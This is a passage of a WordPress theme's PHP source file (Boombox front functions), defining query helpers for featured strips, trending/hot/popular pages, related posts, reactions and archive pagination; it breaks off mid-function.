<?php
/**
 * Boombox front functions
 *
 * @package BoomBox_Theme
 */

// Prevent direct script access.
if ( ! defined( 'ABSPATH' ) ) {
	die( 'No direct script access allowed' );
}


/**
 * Color Scheme
 */
require_once( BOOMBOX_FRONT_PATH . 'color-scheme.php' );

/**
 * Global Functions
 */
require_once( BOOMBOX_FRONT_PATH . 'global-functions.php' );

/**
 * Loop Helper
 */
require_once( BOOMBOX_FRONT_PATH . 'lib/class-boombox-loop-helper.php' );


/**
 * Hooks
 */
add_action( 'pre_get_posts', 'boombox_archive_args', 1 );
add_action( 'boombox_single_post_text_before_share', 'boombox_single_post_text_before_share' );
add_action('wp', 'boombox_remove_admin_bar', 10);

add_filter( 'boombox_rate_jobs', 'boombox_create_predefined_jobs' );
add_filter( 'wp_link_pages_args', 'boombox_wp_link_pages_args' );
add_filter( 'post_thumbnail_html', 'boombox_post_thumbnail_fallback', 20, 5 );
add_filter( 'embed_oembed_html', 'boombox_wrapper_embed_oembed_html', 10, 999 );
add_filter( 'shortcode_atts_video', 'boombox_shortcode_atts_video', 10, 4 );
add_filter( 'boombox_badge_wrapper_advanced_classes', 'boombox_add_additional_badge_classes', 10, 3 );
add_filter( 'comment_reply_link', 'boombox_comment_reply_link', 10, 4 );

// Mailchimp for WP.
if ( boombox_is_plugin_active( 'mailchimp-for-wp/mailchimp-for-wp.php' ) ) {
	add_filter( 'mc4wp_form_before_fields', 'boombox_mc4wp_form_before_form', 10, 2 );
	add_filter( 'mc4wp_form_after_fields', 'boombox_mc4wp_form_after_form', 10, 2 );
}

/**
 * Get Featured Strip Settings
 *
 * @return array
 */
function boombox_get_featured_strip_settings(){
	$size = 'big';
	if ( is_archive() ) {
		$size = boombox_get_theme_option( 'layout_archive_strip_size' );
		$title_position = boombox_get_theme_option( 'layout_archive_strip_title_position' );
	} elseif ( is_page() ) {
		$size = boombox_get_theme_option( 'layout_page_strip_size' );
		$title_position = boombox_get_theme_option( 'layout_page_strip_title_position' );
	} elseif( is_single() ){
		$size = boombox_get_theme_option( 'layout_post_strip_size' );
		$title_position = boombox_get_theme_option( 'layout_post_strip_title_position' );
	}

	$query = boombox_get_featured_strip_items();

	return array(
		'query' 			=> $query,
		'size'  			=> $size,
		'title_position'	=> $title_position
	);
}

/**
 * Get Featured Strip Items
 *
 * @return WP_Query
 */
function boombox_get_featured_strip_items() {
	$conditions          = '';
	$time_range          = '';
	$categories          = array();
	$tags                = array();
	$excluded_categories = array();
	$is_page_query       = false;
	$post_type           = 'post';
	$is_grid             = false;
	$posts_per_page      = 0;
	if ( is_archive()) {
		$conditions     = boombox_get_theme_option( 'layout_archive_strip_conditions' );
		$time_range     = boombox_get_theme_option( 'layout_archive_strip_time_range' );
		$categories     = boombox_get_theme_option( 'layout_archive_strip_category' );
		$tags           = boombox_get_theme_option( 'layout_archive_strip_tags' );
		$posts_per_page = boombox_get_theme_option( 'layout_archive_strip_items_count' );
	} elseif ( is_page() ) {
		$conditions     = boombox_get_theme_option( 'layout_page_strip_conditions' );
		$time_range     = boombox_get_theme_option( 'layout_page_strip_time_range' );
		$categories     = boombox_get_theme_option( 'layout_page_strip_category' );
		$tags           = boombox_get_theme_option( 'layout_page_strip_tags' );
		$posts_per_page = boombox_get_theme_option( 'layout_page_strip_items_count' );
	}elseif ( is_single() ) {
		$conditions     = boombox_get_theme_option( 'layout_post_strip_conditions' );
		$time_range     = boombox_get_theme_option( 'layout_post_strip_time_range' );
		$categories     = boombox_get_theme_option( 'layout_post_strip_category' );
		$tags           = boombox_get_theme_option( 'layout_post_strip_tags' );
		$posts_per_page = boombox_get_theme_option( 'layout_post_strip_items_count' );
	}

	if ( $posts_per_page == - 1 ) {
		$posts_per_page = - 1;
	} elseif ( $posts_per_page < 6 ) {
		$posts_per_page = 6;
	}

	$nsfw_category_id = boombox_get_nsfw_category_id();
	if ( $nsfw_category_id ) {
		$excluded_categories = array( $nsfw_category_id );
	}

	$query = boombox_get_posts_query( $conditions, $time_range, $categories, $tags, $posts_per_page, $post_type, 1, - 1, $is_grid, $is_page_query, $excluded_categories );

	return $query;
}

/**
 * Return Get Featured Strip Items
 *
 * @return WP_Query
 */
function boombox_get_footer_featured_strip_items(){
	$conditions          = boombox_get_theme_option( 'design_footer_strip_conditions' );
	$time_range          = boombox_get_theme_option( 'design_footer_strip_time_range' );
	$categories          = boombox_get_theme_option( 'design_footer_strip_category' );
	$tags                = boombox_get_theme_option( 'design_footer_strip_tags' );
	$posts_per_page      = boombox_get_theme_option( 'design_footer_strip_items_count' );
	$excluded_categories = array();
	$is_page_query       = false;
	$post_type           = 'post';
	$is_grid             = false;

	if( $posts_per_page == -1 ){
		$posts_per_page = -1;
	}elseif( $posts_per_page < 6 ){
		$posts_per_page = 6;
	}

	$nsfw_category_id = boombox_get_nsfw_category_id();
	if ( $nsfw_category_id ) {
		$excluded_categories = array( $nsfw_category_id );
	}

	$query = boombox_get_posts_query( $conditions, $time_range, $categories, $tags, $posts_per_page, $post_type, 1, -1, $is_grid, $is_page_query, $excluded_categories );

	return $query;
}

/**
 * Get featured area query
 *
 * @return WP_Query
 */
function boombox_get_featured_area_items() {
	$conditions          = '';
	$time_range          = '';
	$categories          = array();
	$tags                = array();
	$excluded_categories = array();
	$posts_per_page      = 2;
	$is_page_query       = false;
	$post_type           = 'post';
	$is_grid             = false;

	if ( is_archive() ) {
		$archive_obj   = get_queried_object();
		if( is_category() && $archive_obj ){
			$categories = array( $archive_obj->slug );
		}elseif( is_tag() && $archive_obj ){
			$tags = array( $archive_obj->slug );
		}
		$conditions     = boombox_get_theme_option( 'layout_archive_featured_conditions' );
		$time_range     = boombox_get_theme_option( 'layout_archive_featured_time_range' );
		$featured_type  = boombox_get_theme_option( 'layout_archive_featured_type' );
	} elseif ( is_page() ) {
		$conditions    = boombox_get_theme_option( 'layout_page_featured_conditions' );
		$time_range    = boombox_get_theme_option( 'layout_page_featured_time_range' );
		$categories    = boombox_get_theme_option( 'layout_page_featured_category' );
		$tags          = boombox_get_theme_option( 'layout_page_featured_tags' );
		$featured_type = boombox_get_theme_option( 'layout_page_featured_type' );
	}
	$posts_per_page = $featured_type ? (int) $featured_type : $posts_per_page;

	$nsfw_category_id = boombox_get_nsfw_category_id();
	if( $nsfw_category_id ){
		$excluded_categories = array( $nsfw_category_id );
	}

	$query = boombox_get_posts_query( $conditions, $time_range, $categories, $tags, $posts_per_page, $post_type, 1, -1, $is_grid, $is_page_query, $excluded_categories );

	return $query;
}

/**
 * Get related posts query
 *
 * @param $conditions
 * @param $posts_per_page
 *
 * @return WP_Query
 */
function boombox_get_related_posts_items( $conditions, $posts_per_page ){
	global $post;

	$time_range = '';
	$categories = array();
	$tags       = array();

	$rel_tags = get_the_terms( $post->ID, 'post_tag' );
	if ( !empty( $rel_tags ) ) {
		$tags = wp_list_pluck( $rel_tags, 'slug' );
	}

	$query = boombox_get_posts_query( $conditions, $time_range, $categories, $tags, $posts_per_page);

	return $query;
}

/**
 * Get "More From" Section posts query
 *
 * @param $conditions
 * @param $post_first_category
 * @param $posts_per_page
 *
 * @return WP_Query
 */
function boombox_get_more_from_posts_items( $conditions, $post_first_category, $posts_per_page ){

	$time_range = '';
	$categories = array();
	$tags       = array();

	if( $post_first_category ){
		$categories = array(
			$post_first_category->slug
		);
	}

	$query = boombox_get_posts_query( $conditions, $time_range, $categories, $tags, $posts_per_page);

	return $query;
}

/**
 * Get "Don't Miss" Section posts query
 *
 * @param $conditions
 * @param $posts_per_page
 *
 * @return WP_Query
 */
function boombox_get_dont_miss_posts_items($conditions, $posts_per_page){

	$time_range = 'all';
	$categories = array();
	$tags       = array();

	$query = boombox_get_posts_query( $conditions, $time_range, $categories, $tags, $posts_per_page);

	return $query;
}

/**
 * Get trending page settings
 *
 * @param $paged
 *
 * @return array
 */
function boombox_get_trending_page_settings( $paged ){
	global $post;

	$query              = null;
	$type               = false;
	$hide_page_title    = (bool) get_post_meta( $post->ID, 'boombox_hide_page_title', true );
	$pagination_type    = get_post_meta( $post->ID, 'boombox_pagination_type', true );
	$posts_per_page     = get_post_meta( $post->ID, 'boombox_posts_per_page', true );
	$page_ad            = get_post_meta( $post->ID, 'boombox_page_ad', true );
	$instead_ad         = get_post_meta( $post->ID, 'boombox_inject_ad_instead_post', true );
	$page_newsletter    = get_post_meta( $post->ID, 'boombox_page_newsletter', true );
	$instead_newsletter = get_post_meta( $post->ID, 'boombox_inject_newsletter_instead_post', true );
	$listing_type       = apply_filters( 'boombox_trending_page_listing_type', 'numeric-list' );
	$is_grid            = 'grid' == $listing_type ? true : false;

	if ( boombox_is_trending_page( 'trending' ) ) {
		$type = 'trending';
	} elseif ( boombox_is_trending_page( 'hot' ) ) {
		$type = 'hot';
	} elseif ( boombox_is_trending_page( 'popular' ) ) {
		$type = 'popular';
	}

	if( 'none' == $pagination_type ){
		$posts_per_page = -1;
	}

	if( $type ){
		$query = boombox_get_trending_posts( $type, $posts_per_page, $paged, $is_grid, $page_ad, $instead_ad, $page_newsletter, $instead_newsletter );
		if ( is_object( $query ) ) {
			$query->is_page = true;
			$query->is_singular = true;
		}
	}

	return array(
		'hide_page_title' => $hide_page_title,
		'listing_type'    => $listing_type,
		'pagination_type' => $pagination_type,
		'posts_per_page'  => $posts_per_page,
		'query'           => $query
	);
}

/**
 * Get Trending Posts
 *
 * @param $type
 * @param $posts_per_page
 * @param int $paged
 * @param bool $is_grid
 * @param string $page_ad
 * @param int $instead_ad
 * @param string $page_newsletter
 * @param int $instead_newsletter
 * @param bool $is_widget
 *
 * @return bool
 */
function boombox_get_trending_posts( $type, $posts_per_page, $paged = 1, $is_grid = false, $page_ad = 'none', $instead_ad = 1, $page_newsletter = 'none', $instead_newsletter = 1, $is_widget = false ){
	static $boombox_trending_query;

	if( $is_widget ){
		unset( $boombox_trending_query[ $type ] );
	}

	if( !isset( $boombox_trending_query[ $type ] ) ){
		$post_type     = 'post';
		$query         = null;
		$fake_meta_key = null;
		$criteria_name = boombox_get_theme_option( 'settings_trending_conditions' );

		if ( 'trending' == $type ) {
			$time_range  = 'day';
			$posts_count = boombox_get_theme_option( 'settings_trending_posts_count' );
			$fake_meta_key = 'boombox_keep_trending';
		} elseif ( 'hot' == $type ) {
			$time_range  = 'week';
			$posts_count = boombox_get_theme_option( 'settings_hot_posts_count' );
			$fake_meta_key = 'boombox_keep_hot';
		} elseif ( 'popular' == $type ) {
			$time_range  = 'month';
			$posts_count = boombox_get_theme_option( 'settings_popular_posts_count' );
			$fake_meta_key = 'boombox_keep_popular';
		}

		if ( Boombox_Rate_Criteria::get_criteria_by_name( $criteria_name ) && $job = Boombox_Rate_Job::get_job_by_name( $type ) ) {
			$args = array(
				'nopaging'            => false,
				'ignore_sticky_posts' => true
			);

			if( -1 != $posts_per_page ){
				$args['posts_per_page'] = $posts_per_page;
			}else{
				$args['nopaging'] = true;
			}

			if( $paged ){
				$args['paged'] = $paged;
			}

			$is_adv_enabled = boombox_is_adv_enabled( $page_ad );
			$is_newsletter_enabled = boombox_is_newsletter_enabled( $page_newsletter );
			if( $is_adv_enabled || $is_newsletter_enabled ){
				Boombox_Loop_Helper::init( $is_adv_enabled, $instead_ad, $is_newsletter_enabled, $instead_newsletter, $is_grid, $posts_per_page, $paged );
				$args['offset'] = Boombox_Loop_Helper::get_offset();
			}

			$rate_query = new Boombox_Rate_Query( $args, $job, $fake_meta_key );

			$query = $rate_query->get_wp_query();

		} elseif ( 'most_shared' == $criteria_name || 'recent' === $criteria_name || 'featured' === $criteria_name ) {
			$categories = array();
			$tags       = array();
			$is_page_query = true;
			$excluded_categories = array();
			$is_live = false;
			$query = boombox_get_posts_query( $criteria_name, $time_range, $categories, $tags, $posts_per_page, $post_type, $paged, $posts_count, $is_grid, $is_page_query, $excluded_categories, $is_live, $fake_meta_key );
		}

		if ( $query ){
			if( 'trending' == $type){
				$boombox_trending_query[ 'trending' ] = $query;
			}elseif( 'hot' == $type){
				$boombox_trending_query[ 'hot' ] = $query;
			}elseif( 'popular' == $type){
				$boombox_trending_query[ 'popular' ] = $query;
			}
			return $boombox_trending_query[ $type ];
		}

	}else{
		return $boombox_trending_query[ $type ];
	}

	return false;
}

/**
 * Get trending page id by type
 *
 * @param $type 'trending' |'hot' |'popular'
 *
 * @return int|mixed
 */
function boombox_get_trending_page_id( $type ){
	$trending_page_id = 0;
	$customize_setting_slug = "settings_{$type}_page";
	$settings_trending_page  = boombox_get_theme_option( $customize_setting_slug );
	if( is_string( $settings_trending_page ) ){
		$trending_page_slug = esc_html( $settings_trending_page );
		$trending_page = get_page_by_path( $trending_page_slug );
		if ( null != $trending_page ){
			return $trending_page->ID;
		}
	}elseif( is_numeric( $settings_trending_page ) ){
		return $settings_trending_page;
	}
	return $trending_page_id;
}

/**
 * Return true if is trending page
 *
 * @param $type 'trending' |'hot' |'popular'
 * @param int $post_id
 *
 * @return bool
 */
function boombox_is_trending_page( $type, $post_id = 0 ){
	if( 0 == $post_id ){
		global $post;
		if( is_object( $post ) ){
			$post_id = $post->ID;
		}
	}

	$post = get_post( $post_id );

	if( !$post ){
		return false;
	}

	$trending_page_id = boombox_get_trending_page_id( $type );
	if( $trending_page_id && $post_id == $trending_page_id ){
		return true;
	}

	return false;
}

/**
 * Check, if post is trending
 *
 * @param $type 'trending' | 'hot' | 'popular'
 * @param $post_id
 *
 * @return bool
 */
function boombox_is_post_trending( $type, $post_id ){
	$time_range               = false;
	$posts_count              = false;
	$trending_conditions      = boombox_get_theme_option( 'settings_trending_conditions' );
	$trending_disable         = boombox_get_theme_option( 'settings_trending_disable' );
	$settings_hot_disable     = boombox_get_theme_option( 'settings_hot_disable' );
	$settings_popular_disable = boombox_get_theme_option( 'settings_popular_disable' );

	if ( ( 'trending' === $type && $trending_disable ) ||
	     ( 'hot' === $type && $settings_hot_disable ) ||
	     ( 'popular' === $type && $settings_popular_disable ) ) {
		return false;
	}

	if ( Boombox_Rate_Criteria::get_criteria_by_name( $trending_conditions ) ) {
		return Boombox_Rate_Cron::is_post_rated( Boombox_Rate_Job::get_job_by_name( $type ), $post_id );
	}

	if ( 'trending' === $type && ! $trending_disable ) {
		$time_range  = 'day';
		$posts_count = boombox_get_theme_option( 'settings_trending_posts_count' );
	} elseif ( 'hot' === $type && ! $settings_hot_disable ) {
		$time_range  = 'week';
		$posts_count = boombox_get_theme_option( 'settings_hot_posts_count' );
	} elseif ( 'popular' === $type && ! $settings_popular_disable ) {
		$time_range  = 'month';
		$posts_count = boombox_get_theme_option( 'settings_popular_posts_count' );
	}

	if ( $time_range && $posts_count ){
		if ( 'most_shared' === $trending_conditions || 'recent' === $trending_conditions) {
			$query = boombox_get_trending_posts( $type, $posts_count );
			if( is_object( $query ) && count( $query->posts ) > 0 ){
				$trending_ids = wp_list_pluck( $query->posts, 'ID' );
				if ( in_array( $post_id, $trending_ids ) ){
					return true;
				}
			}
		}
	}

	return false;
}

/**
 * Return true, if is trending, hot or popular page
 *
 * @param int $post_id
 *
 * @return bool
 */
function boombox_is_trending( $post_id = 0 ){
	if( 0 == $post_id ){
		global $post;
		if( is_object( $post ) ){
			$post_id = $post->ID;
		}
	}

	$post = get_post( $post_id );

	if ( ! $post ) {
		return false;
	}

	if( 'page' == $post->post_type && ( boombox_is_trending_page( 'trending', $post_id ) || boombox_is_trending_page( 'hot', $post_id ) || boombox_is_trending_page( 'popular', $post_id ) ) ){
		return true;
	}
	return false;
}

/**
 * Get Trending Navigation Items
 *
 * @return array
 */
function boombox_get_trending_navigation_items(){
	$trending_pages     = array(
		'trending' => array(
			'page' => 'trending',
			'icon' => boombox_get_theme_option( "design_badges_trending_icon" )
		),
		'hot' => array(
			'page' => 'hot',
			'icon' => 'hot'
		),
		'popular' => array(
			'page' => 'popular',
			'icon' => 'popular'
		)
	);
	$trending_pages_nav = array();
	foreach ( $trending_pages as $trending_page_key => $tr_page_options ) {
		$page_id = boombox_get_trending_page_id ( $tr_page_options['page'] );
		$disabled = boombox_get_theme_option( "settings_" . $tr_page_options['page'] . "_disable" );
		if ( !$disabled && 0 !== $page_id ) {
			$trending_page = get_post( $page_id );
			if ( null !== $trending_page ) {
				$trending_pages_nav[ $trending_page_key ][ 'id' ] = $page_id;
				$trending_pages_nav[ $trending_page_key ][ 'key' ] = $tr_page_options['page'];
				$trending_pages_nav[ $trending_page_key ][ 'href' ] = get_permalink( $trending_page->ID );
				$trending_pages_nav[ $trending_page_key ][ 'name' ] = esc_html( get_the_title( $trending_page ) );
				$trending_pages_nav[ $trending_page_key ][ 'icon' ] = $tr_page_options[ 'icon' ];
			}

		}
	}

	return $trending_pages_nav;
}

/**
 * Get post reaction settings
 *
 * @param int $post_id
 *
 * @return array
 */
function boombox_get_post_reaction_settings( $post_id ){
	$reaction_total        = Boombox_Reaction_Helper::get_reaction_total( $post_id );
	$boombox_all_reactions = function_exists( 'boombox_get_all_reactions' ) ? boombox_get_all_reactions() : false;
	$reaction_restrictions = Boombox_Reaction_Helper::get_post_reaction_restrictions( $post_id );

	$reactions_login_require = (bool) boombox_get_theme_option( 'settings_rating_reactions_login_require' );
	$reaction_item_class     = 'js-reaction-item';
	$authentication_url      = '#';
	$authentication_class    = '';
	if ( $reactions_login_require == true && ! is_user_logged_in() ) {
		$authentication_class = 'js-authentication';
		$authentication_url   = '#sign-in';
		$reaction_item_class  = '';
	}

	return array(
		'reaction_total'          => $reaction_total,
		'all_reactions'           => $boombox_all_reactions,
		'reaction_restrictions'   => $reaction_restrictions,
		'reactions_login_require' => $reactions_login_require,
		'reaction_item_class'     => $reaction_item_class,
		'authentication_url'      => $authentication_url,
		'authentication_class'    => $authentication_class
	);
}

/**
 * Get Time Range args for query argument
 *
 * @param $time_range
 *
 * @return array
 */
function boombox_get_time_range_args( $time_range ) {
	$args = array();

	if ( $time_range == 'all' || $time_range == '' ){
		return $args;
	}

	$args['date_query'] = array(
		array(
			'after' => sprintf( esc_html__( "1 %s ago", 'boombox' ), $time_range )
		)
	);

	return $args;
}

/**
 * Get categories args for query argument
 *
 * @param $categories
 *
 * @return array
 */
function boombox_categories_args( $categories ) {
	$args = array();
	if ( empty( $categories ) ) {
		return $args;
	}
	if ( ! is_array( $categories ) || 0 == count( $categories ) || '' == $categories[0] ) {
		return $args;
	}

	$args = array(
		'taxonomy' => 'category',
		'field'    => 'slug',
		'terms'    => $categories,
		'operator' => 'IN'
	);

	return $args;
}

/**
 * Get tags args for query argument
 *
 * @param $tags
 *
 * @return array
 */
function boombox_tags_args( $tags ) {
	$args = array();
	if ( empty( $tags ) ) {
		return $args;
	}
	if ( ! is_array( $tags ) || 0 == count( $tags ) || '' == $tags[0] ) {
		return $args;
	}

	$args = array(
		'taxonomy' => 'post_tag',
		'field'    => 'slug',
		'terms'    => $tags,
		'operator' => 'IN'
	);

	return $args;
}

/**
 * Get post types args for query
 *
 * @param $post_types
 *
 * @return array
 */
function boombox_get_post_types_args ( $post_types ){
	$args = array();

	if( empty( $post_types ) || !is_string( $post_types ) || !is_array( $post_types )){
		return array( 'post' );
	}

	if( is_string( $post_types ) ){
		$args = explode( ',', $post_types );
	}

	return $args;
}

/**
 * Set 'posts_per_page' params to archive
 *
 * @param $query
 */
function boombox_archive_args( $query ) {
	if ( is_admin() || ! $query->is_main_query() ) {
		return;
	}

	if ( ! is_archive() ) {
		return;
	}

	/**
	 * Todo for future releases
	 $disable_featured_area = boombox_get_theme_option( 'layout_archive_disable_featured_area' );
	if( !$disable_featured_area ){
		$featured_query = boombox_get_featured_area_items();
		if ( null != $featured_query ){
			$featured_ids   = wp_list_pluck( $featured_query->posts, 'ID' ); ;
			if ( ! empty( $featured_ids ) ) {
				$query->set( 'post__not_in', $featured_ids );
			}
		}
	}*/

	$posts_per_page            = boombox_get_theme_option( 'layout_archive_posts_per_page' );
	$layout_archive_ad         = boombox_get_theme_option( 'layout_archive_ad' );
	$layout_archive_newsletter = boombox_get_theme_option( 'layout_archive_newsletter' );
	$paged                     = boombox_get_paged();
	$offset                     = $query->get('offset');
	$query->set( 'posts_per_page', $posts_per_page );


	$is_adv_enabled = boombox_is_adv_enabled( $layout_archive_ad );
	$is_newsletter_enabled = boombox_is_newsletter_enabled( $layout_archive_newsletter );
	if( $is_adv_enabled || $is_newsletter_enabled ){
		$archive_listing_type = boombox_get_theme_option( 'layout_archive_listing_type' );
		$instead_ad           = boombox_get_theme_option( 'layout_archive_inject_ad_instead_post' );
		$instead_newsletter   = boombox_get_theme_option( 'layout_archive_inject_newsletter_instead_post' );
		$is_grid              = 'grid' == $archive_listing_type ? true : false;
		Boombox_Loop_Helper::init( $is_adv_enabled, $instead_ad, $is_newsletter_enabled, $instead_newsletter, $is_grid, $posts_per_page, $paged, $offset );
		$query->set( 'offset', Boombox_Loop_Helper::get_offset() );
	}
}

/**
 * Get post first category
 *
 * @param $post
 *
 * @return bool
 */
function boombox_get_post_first_category( $post ){
	if( ! $post ){
		global $post;
	}
	$post_id = $post->ID;

	$post_categories = get_the_category( $post_id );

	if( !empty( $post_categories ) ){
		$post_first_category = $post_categories[0];

		return $post_first_category;
	}

	return false;
}

/**
 * Get query for pages by condition
 *
 * @param $conditions
 * @param $time_range
 * @param $categories
 * @param $tags
 * @param int $posts_per_page
 * @param array $post_type
 * @param int $paged
 * @param int $posts_count
 * @param bool $is_grid
 * @param bool $is_page_query
 * @param array $excluded_categories
 * @param bool $is_live
 * @param string $fake_meta_key (only for 'most_shared' condition)
 *
 * @return null|WP_Query
 */
function boombox_get_posts_query( $conditions, $time_range, $categories, $tags, $posts_per_page = - 1, $post_type = array( 'post' ), $paged = 1, $posts_count = -1, $is_grid = false, $is_page_query = true, $excluded_categories = array(), $is_live = false, $fake_meta_key = null ) {
	global $wpdb, $post;

	$query           = null;
	$page_ad         = false;
	$page_newsletter = false;
	$instead         = 0;
	$instead_newsletter         = 0;

	if( is_page() && $is_page_query ){
		$page_ad = get_post_meta( $post->ID, 'boombox_page_ad', true );
		$instead = get_post_meta( $post->ID, 'boombox_inject_ad_instead_post', true );

		$page_newsletter = get_post_meta( $post->ID, 'boombox_page_newsletter', true );
		$instead_newsletter = get_post_meta( $post->ID, 'boombox_inject_newsletter_instead_post', true );
	}

	$post_type = boombox_get_post_types_args( $post_type );
	if( Boombox_Rate_Criteria::get_criteria_by_name( $conditions ) ) {
		$args = array(
			'ignore_sticky_posts' => true
		);

		$categories_args = boombox_categories_args( $categories );
		if ( $categories_args ) {
			$args['tax_query'][] = $categories_args;
		}

		$tags_args = boombox_tags_args( $tags );
		if ( $tags_args ) {
			$args['tax_query'][] = $tags_args;
		}
		if ( $categories_args && $tags_args ) {
			$args['tax_query']['relation'] = 'AND';
		}

		if( -1 != $posts_per_page ){
			$args['posts_per_page'] = $posts_per_page;
		}else{
			$args['nopaging'] = true;
		}

		if( $paged ){
			$args['paged'] = $paged;
		}

		if( !empty( $excluded_categories ) ){
			$args['category__not_in'] = $excluded_categories;
		}

		$is_adv_enabled = boombox_is_adv_enabled( $page_ad );
		$is_newsletter_enabled = boombox_is_newsletter_enabled( $page_newsletter );
		if( ( $is_adv_enabled || $is_newsletter_enabled ) && $is_page_query ){
			Boombox_Loop_Helper::init( $is_adv_enabled, $instead, $is_newsletter_enabled, $instead_newsletter, $is_grid, $posts_per_page, $paged );
			$args['offset'] = Boombox_Loop_Helper::get_offset();
		}

		if( 'all' == $time_range ){
			$is_live = true;
		}

		$job = boombox_get_rate_job( $conditions, $post_type, $time_range, $posts_count, 0, $is_live);
		$rate_query = new Boombox_Rate_Query( $args, $job, $fake_meta_key );
		$query = $rate_query->get_wp_query();

	} else {
		switch ( $conditions ) {
			case 'recent':
				$args = array(
					'post_status'         => 'publish',
					'post_type'           => $post_type,
					'orderby'             => 'date',
					'order'               => 'DESC',
					'posts_per_page'      => $posts_per_page,
					'ignore_sticky_posts' => true
				);

				$time_range_args = boombox_get_time_range_args( $time_range );
				if ( $time_range_args ) {
					$args = array_merge( $args, $time_range_args );
				}

				$categories_args = boombox_categories_args( $categories );
				if ( $categories_args ) {
					$args['tax_query'][] = $categories_args;
				}
				$tags_args = boombox_tags_args( $tags );
				if ( $tags_args ) {
					$args['tax_query'][] = $tags_args;
				}
				if ( $categories_args && $tags_args ) {
					$args['tax_query']['relation'] = 'AND';
				}

				if( $paged ){
					$args['paged'] = $paged;
				}

				if( !empty( $excluded_categories ) ){
					$args['category__not_in'] = $excluded_categories;
				}

				$is_adv_enabled = boombox_is_adv_enabled( $page_ad );
				$is_newsletter_enabled = boombox_is_newsletter_enabled( $page_newsletter );
				if( ( $is_adv_enabled || $is_newsletter_enabled ) && $is_page_query ){
					Boombox_Loop_Helper::init( $is_adv_enabled, $instead, $is_newsletter_enabled, $instead_newsletter, $is_grid, $posts_per_page, $paged );
					$args['offset'] = Boombox_Loop_Helper::get_offset();
				}

				$query = new WP_Query( $args );

				break;

			case 'most_shared':
				// get a most shared posts ids
				$args = array(
					'post_status'         => 'publish',
					'post_type'           => $post_type,
					'posts_per_page'      => -1,
					'ignore_sticky_posts' => true,
					'fields'              => 'ids',
					'orderby'             => 'meta_value',
					'order'               => 'DESC',
					'meta_query'          => array(
						array(
							'key'     => 'mashsb_shares',
							'value'   => 0,
							'compare' => '>'
						),
					),
				);

				$categories_args = boombox_categories_args( $categories );
				if ( $categories_args ) {
					$args['tax_query'][] = $categories_args;
				}
				$tags_args = boombox_tags_args( $tags );
				if ( $tags_args ) {
					$args['tax_query'][] = $tags_args;
				}
				if ( $categories_args && $tags_args ) {
					$args['tax_query']['relation'] = 'AND';
				}

				$time_range_args = boombox_get_time_range_args( $time_range );
				if ( $time_range_args ) {
					$args = array_merge( $args, $time_range_args );
				}

				if( !empty( $excluded_categories ) ){
					$args['category__not_in'] = $excluded_categories;
				}

				$most_shared_ids = array();
				$main_query = new WP_Query( $args );
				if( $main_query->have_posts() ){
					$most_shared_ids = $main_query->posts;
				}

				// get a fake posts ids ( for trending pages )
				if( null != $fake_meta_key ){
					$args = array(
						'post_status'         => 'publish',
						'post_type'           => $post_type,
						'posts_per_page'      => -1,
						'ignore_sticky_posts' => true,
						'fields'              => 'ids',
						'meta_query'          => array(
							array(
								'key'     => $fake_meta_key,
								'value'   => 0,
								'compare' => '>'
							),
						),
					);

					$fake_posts_query = new WP_Query( $args );
					if( $fake_posts_query->have_posts() ){
						$most_shared_ids = array_merge( $most_shared_ids, $fake_posts_query->posts );
					}
				}

				if( empty( $most_shared_ids ) ){
					// Passing an empty array to post__in will return all posts.
					// to prevent this we set into array fake post id
					$most_shared_ids = array( 0 );
				}

				$args = array(
					'post_status'         => 'publish',
					'post_type'           => $post_type,
					'posts_per_page'      => $posts_per_page,
					'meta_key'            => 'mashsb_shares',
					'orderby'             => 'meta_value_num',
					'order'               => 'DESC',
					'ignore_sticky_posts' => true,
					'post__in'            => $most_shared_ids
				);

				if( $paged ){
					$args['paged'] = $paged;
				}

				$is_adv_enabled = boombox_is_adv_enabled( $page_ad );
				$is_newsletter_enabled = boombox_is_newsletter_enabled( $page_newsletter );
				if( ( $is_adv_enabled || $is_newsletter_enabled ) && $is_page_query ){
					Boombox_Loop_Helper::init( $is_adv_enabled, $instead, $is_newsletter_enabled, $instead_newsletter, $is_grid, $posts_per_page, $paged );
					$args['offset'] = Boombox_Loop_Helper::get_offset();
				}

				$query = new WP_Query( $args );

				break;

			case 'featured':
				$args = array(
					'post_status'         => 'publish',
					'post_type'           => $post_type,
					'posts_per_page'      => $posts_per_page,
					'orderby'             => 'date',
					'order'               => 'DESC',
					'meta_query'          => array(
						array(
							'key'     => 'boombox_is_featured',
							'compare' => '=',
							'value'   => 1
						),
					),
					'ignore_sticky_posts' => true,
				);

				$time_range_args = boombox_get_time_range_args( $time_range );
				if ( $time_range_args ) {
					$args = array_merge( $args, $time_range_args );
				}

				$categories_args = boombox_categories_args( $categories );
				if ( $categories_args ) {
					$args['tax_query'][] = $categories_args;
				}
				$tags_args = boombox_tags_args( $tags );
				if ( $tags_args ) {
					$args['tax_query'][] = $tags_args;
				}
				if ( $categories_args && $tags_args ) {
					$args['tax_query']['relation'] = 'AND';
				}

				if( $paged ){
					$args['paged'] = $paged;
				}

				if( !empty( $excluded_categories ) ){
					$args['category__not_in'] = $excluded_categories;
				}

				$is_adv_enabled = boombox_is_adv_enabled( $page_ad );
				$is_newsletter_enabled = boombox_is_newsletter_enabled( $page_newsletter );
				if( ( $is_adv_enabled || $is_newsletter_enabled ) && $is_page_query ){
					Boombox_Loop_Helper::init( $is_adv_enabled, $instead, $is_newsletter_enabled, $instead_newsletter, $is_grid, $posts_per_page, $paged );
					$args['offset'] = Boombox_Loop_Helper::get_offset();
				}

				$query = new WP_Query( $args );

				break;

			case 'related':
				if( $post ){
					$related_ids = array();

					if ( !empty( $tags ) ) {
						// get posts id's filtered by current post tags
						$related_args = array(
							'posts_per_page'        => $posts_per_page,
							'post_type'             => $post_type,
							'post_status'           => 'publish',
							'ignore_sticky_posts'   => true,
							'post__not_in'          => array( $post->ID ), // Exclude current post.
							'fields'                => 'ids'
						);

						if( !empty( $excluded_categories ) ){
							$related_args['category__not_in'] = $excluded_categories;
						}
						$time_range_args = boombox_get_time_range_args( $time_range );
						if ( $time_range_args ) {
							$related_args = array_merge( $related_args, $time_range_args );
						}
						$categories_args = boombox_categories_args( $categories );
						if ( $categories_args ) {
							$related_args['tax_query'][] = $categories_args;
						}
						$tags_args = boombox_tags_args( $tags );
						if ( $tags_args ) {
							$related_args['tax_query'][] = $tags_args;
						}
						if ( $categories_args && $tags_args ) {
							$related_args['tax_query']['relation'] = 'AND';
						}


						$related_query = new WP_Query( $related_args );
						if( $related_query->have_posts() ){
							$related_ids = $related_query->posts;
						}

						// if related posts smaller than necessary, add ids from recent posts
